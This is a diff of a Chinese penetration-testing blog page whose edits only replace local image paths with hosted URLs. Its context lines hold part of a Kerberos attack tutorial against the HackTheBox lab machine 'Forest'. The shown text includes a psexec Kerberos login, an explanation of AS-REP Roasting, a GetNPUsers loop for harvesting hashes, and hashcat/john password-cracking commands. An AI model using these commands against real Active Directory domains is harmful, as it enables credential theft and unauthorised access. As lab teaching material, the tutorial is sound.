@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZS52zRh9IQ.png">
 <meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gJoqbP2GKj.png">
 <meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_LcDgW17HNN.png">
-<meta property="og:image" content="c:\Users\aurey\Downloads\Compressed\Kerberos\image\image_sj04BCwUub.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sj04BCwUub.png">
 <meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Nigw5qriD.png">
 <meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_W3eE0H-c91.png">
 <meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dY170jQ6L-.png">
@@ -39,7 +39,7 @@
 <meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_M3fFHJ-7LV.png">
 <meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_y47Ef1YU8I.png">
 <meta property="article:published_time" content="2023-07-26T13:26:53.000Z">
-<meta property="article:modified_time" content="2023-07-26T13:36:52.678Z">
+<meta property="article:modified_time" content="2023-07-26T13:44:32.919Z">
 <meta property="article:author" content="Aurey7">
 <meta property="article:tag" content="域渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -355,7 +355,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br>10.10.10.161 htb.local forest<br><br>python psexec.py htb.local/auray@forest -k -no-pass<br></code></pre></td></tr></table></figure>
 <h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p><strong>攻击场景：</strong> 如果拿到了用户名，目标服务器又暴露了kerberos端口，可以尝试AS-REP Roasting攻击</p>
 <p>当被攻击账号设置 <strong>“不需要Kerberos预身份验证”</strong> 后，在AS_REP过程中就可以任意伪造用户名（无需Client Hash）请求凭据，AS会将伪造请求的用户名NTLM Hash加密后返回，对收到的AS_REP内容（enc-part底下的cipher，因为这部分时使用用户hash加密的session-key，我们通过离线爆破就可以获得用户hash）重新组合，能够拼接成 “Kerberos 5 AS_REP etype 23”（18200）的格式，使用hashcat对其进行爆破，最终获取该用户的明文口令</p>
-<p><img src="C:\Users\aurey\Downloads\Compressed\Kerberos\image\image_sj04BCwUub.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" /></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sj04BCwUub.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" /></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> user.txt);<span class="hljs-keyword">do</span> python3 examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/<span class="hljs-variable">$&#123;user&#125;</span> | grep -v impacket;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
 <p>拿到Hash之后可以通过hashcat爆破密码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 18200 svc-alfredsco.kerb /usr/share/wordlists/rockyou.txt --force<br>john --wordlist=/usr/share/wordlists/rockyou.txt svc.txt<br><br></code></pre></td></tr></table></figure>
